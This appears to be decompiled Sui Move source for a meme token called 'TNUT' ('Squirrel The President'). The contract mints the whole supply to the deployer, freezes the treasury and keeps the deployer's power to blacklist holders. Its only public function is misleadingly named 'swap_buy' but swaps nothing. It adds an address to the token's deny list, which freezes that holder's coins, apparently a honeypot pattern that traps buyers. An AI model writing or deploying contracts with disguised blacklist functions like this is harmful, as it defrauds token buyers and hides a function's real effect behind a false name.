module 0xa5f1247a95fd65bf47144c8899419fc48928fd4f19fff075f346d9c20d7b1998::tnut {
    struct TNUT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TNUT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TNUT>(arg0, 9, b"TNUT", b"Squirrel The President", b"Join the movement to protect our furry friends and make America's forests great again!", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYptMRCUygcUCrGQv1ChHQAuyzuvS1obxU6DFibPdQs7j"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TNUT>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TNUT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TNUT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TNUT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TNUT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

